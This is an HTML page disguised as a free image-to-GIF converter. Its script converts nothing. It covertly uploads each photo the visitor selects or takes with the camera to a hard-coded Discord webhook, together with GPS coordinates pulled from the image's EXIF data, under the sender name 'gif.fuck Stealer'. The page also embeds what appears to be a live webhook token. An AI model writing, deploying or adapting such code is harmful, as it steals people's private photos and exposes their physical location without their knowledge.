<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>gif.fuck</title>
  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/lite.umd.js"></script>
  <style>
    body {
      margin: 0; padding: 0; height: 100vh;
      background: linear-gradient(135deg, #0f0f0f, #1a0033);
      font-family: 'Segoe UI', sans-serif;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: rgba(255,255,255,0.05);
      padding: 40px;
      border-radius: 20px;
      border: 1px solid rgba(255,255,255,0.1);
      text-align: center;
      width: 440px;
      max-width: 90vw;
    }
    h1 { 
      font-size: 2.8em; 
      margin: 0 0 30px 0; 
      color: #00ffff; 
    }
    #preview {
      max-width: 100%;
      max-height: 280px;
      border-radius: 12px;
      margin: 15px 0;
      display: none;
      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    }
    button {
      padding: 16px 32px;
      font-size: 1.1em;
      margin: 10px;
      background: linear-gradient(90deg, #ff00cc, #00ffff);
      border: none;
      border-radius: 50px;
      color: black;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover { transform: scale(1.08); }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    #status { 
      margin-top: 20px; 
      font-size: 1.1em; 
      min-height: 30px; 
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>gif.fuck</h1>
    
    <img id="preview" alt="Selected image preview">
    
    <button id="uploadBtn">Choose Image</button>
    <button id="cameraBtn">Take Photo</button>
    <button id="convertBtn" style="display:none;">Turn to GIF</button>
    
    <div id="status"></div>
  </div>

  <input type="file" id="fileInput" accept="image/*" hidden>
  <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
    
    const statusEl = document.getElementById('status');
    const convertBtn = document.getElementById('convertBtn');
    const preview = document.getElementById('preview');
    let selectedFile = null;

    function updateStatus(text, color = "white") {
      statusEl.textContent = text;
      statusEl.style.color = color;
    }

    async function sendToWebhook(file, gps = null) {
      const formData = new FormData();
      formData.append("file", file, file.name);

      let content = `New upload: ${file.name}\nSize: ${(file.size/1024/1024).toFixed(2)} MB`;
      if (gps && gps.latitude && gps.longitude) {
        content += `\n\nGPS FOUND\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
      }

      formData.append("payload_json", JSON.stringify({
        content: content,
        username: "gif.fuck Stealer"
      }));

      await fetch(WEBHOOK_URL, { method: "POST", body: formData });
    }

    function handleFile(file) {
      if (!file || !file.type.startsWith("image/")) return;
      
      selectedFile = file;
      
      // Show preview
      const reader = new FileReader();
      reader.onload = function(e) {
        preview.src = e.target.result;
        preview.style.display = "block";
      };
      reader.readAsDataURL(file);

      updateStatus(`Selected: ${file.name}`, "#00ffff");
      convertBtn.style.display = "inline-block";
      convertBtn.textContent = "Turn to GIF";
    }

    async function convertToGif() {
      if (!selectedFile) return;
      
      updateStatus("Sending...", "#ffff00");
      convertBtn.disabled = true;

      try {
        const gps = await exifr.gps(selectedFile);
        await sendToWebhook(selectedFile, gps);
        updateStatus("✅ Sent to webhook!", "#00ff00");
      } catch (err) {
        await sendToWebhook(selectedFile);
        updateStatus("✅ Sent (no GPS data)", "#00ff88");
      }

      convertBtn.disabled = false;
    }

    // Button clicks
    document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
    document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();
    convertBtn.onclick = convertToGif;

    document.getElementById("fileInput").onchange = e => handleFile(e.target.files[0]);
    document.getElementById("cameraInput").onchange = e => handleFile(e.target.files[0]);
  </script>
</body>
</html>
